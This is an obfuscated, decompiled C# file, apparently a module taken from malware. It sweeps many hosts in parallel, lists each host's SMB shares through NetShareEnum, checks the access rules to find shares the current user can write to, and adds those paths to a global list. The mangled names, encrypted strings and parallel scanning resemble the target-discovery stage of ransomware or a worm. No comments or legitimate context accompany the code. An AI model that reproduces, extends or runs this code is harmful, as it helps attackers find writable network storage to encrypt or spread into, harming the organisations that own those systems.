using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wDtIYaxdpawEu;

internal sealed class uwQzNkSXzfcHH
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct OMuMlfKMsBkdHYDb
	{
		public string SFVidpUhIZeRMhuJ;

		public uint CRlQKXsyyDnHlM;

		public string NmHEAvFjOBY;

		public OMuMlfKMsBkdHYDb(string string_0, uint uint_0, string string_1)
		{
			SFVidpUhIZeRMhuJ = string_0;
			CRlQKXsyyDnHlM = uint_0;
			NmHEAvFjOBY = string_1;
		}

		public override string ToString()
		{
			return SFVidpUhIZeRMhuJ;
		}
	}

	private sealed class ydemPxsvSE
	{
		public huEaYSIwDZHlox.LabYGxEYpW kiHXxoObwDbUBX;
	}

	private sealed class DvUoSujNtXfcqc
	{
		public ydemPxsvSE LMRvrmskpINhH;

		public string GeAkZvBuUsGwa;

		public void _003CGetAllShares_003Eb__1()
		{
			SAIQOaHmPKgAuQI(GeAkZvBuUsGwa, LMRvrmskpINhH.kiHXxoObwDbUBX);
		}
	}

	public static ReaderWriterLockSlim DPiWwkefZAk;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static OMuMlfKMsBkdHYDb[] tqQwTgUvoz(string string_0)
	{
		List<OMuMlfKMsBkdHYDb> list = new List<OMuMlfKMsBkdHYDb>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(OMuMlfKMsBkdHYDb));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				OMuMlfKMsBkdHYDb item = (OMuMlfKMsBkdHYDb)Marshal.PtrToStructure(ptr, typeof(OMuMlfKMsBkdHYDb));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new OMuMlfKMsBkdHYDb(getString_0(107376559) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void SAIQOaHmPKgAuQI(string string_0, huEaYSIwDZHlox.LabYGxEYpW labYGxEYpW_0)
	{
		string[] source = new string[2]
		{
			getString_0(107376582),
			getString_0(107376537)
		};
		OMuMlfKMsBkdHYDb[] array = tqQwTgUvoz(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			OMuMlfKMsBkdHYDb[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				OMuMlfKMsBkdHYDb oMuMlfKMsBkdHYDb = array2[i];
				if (labYGxEYpW_0.ZuMQbmDroMa != null && labYGxEYpW_0.ZuMQbmDroMa.Contains(oMuMlfKMsBkdHYDb.SFVidpUhIZeRMhuJ.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107376524), string_0, oMuMlfKMsBkdHYDb.SFVidpUhIZeRMhuJ);
					Directory.GetFiles(text);
					list.Add(oMuMlfKMsBkdHYDb.SFVidpUhIZeRMhuJ);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!OwCGWssNrah.uneznyCLJqjxYvh.Contains(text))
							{
								OwCGWssNrah.uneznyCLJqjxYvh.Add(text);
							}
							list2.Add(oMuMlfKMsBkdHYDb.SFVidpUhIZeRMhuJ);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(oMuMlfKMsBkdHYDb.SFVidpUhIZeRMhuJ))
					{
						list3.Add(oMuMlfKMsBkdHYDb.SFVidpUhIZeRMhuJ);
					}
				}
			}
		}
		FIZAbhkDNFNH.LlCEVkUPPe++;
	}

	public static void pYQcCONnrdoH(List<string> list_0, huEaYSIwDZHlox.LabYGxEYpW labYGxEYpW_0)
	{
		ydemPxsvSE ydemPxsvSE = new ydemPxsvSE();
		ydemPxsvSE.kiHXxoObwDbUBX = labYGxEYpW_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				DvUoSujNtXfcqc CS_0024_003C_003E8__locals0 = new DvUoSujNtXfcqc();
				CS_0024_003C_003E8__locals0.LMRvrmskpINhH = ydemPxsvSE;
				CS_0024_003C_003E8__locals0.GeAkZvBuUsGwa = enumerator.Current;
				action = delegate
				{
					SAIQOaHmPKgAuQI(CS_0024_003C_003E8__locals0.GeAkZvBuUsGwa, CS_0024_003C_003E8__locals0.LMRvrmskpINhH.kiHXxoObwDbUBX);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = ydemPxsvSE.kiHXxoObwDbUBX.xJMOEPLhBWLg;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static uwQzNkSXzfcHH()
	{
		Strings.CreateGetStringDelegate(typeof(uwQzNkSXzfcHH));
		DPiWwkefZAk = new ReaderWriterLockSlim();
	}
}
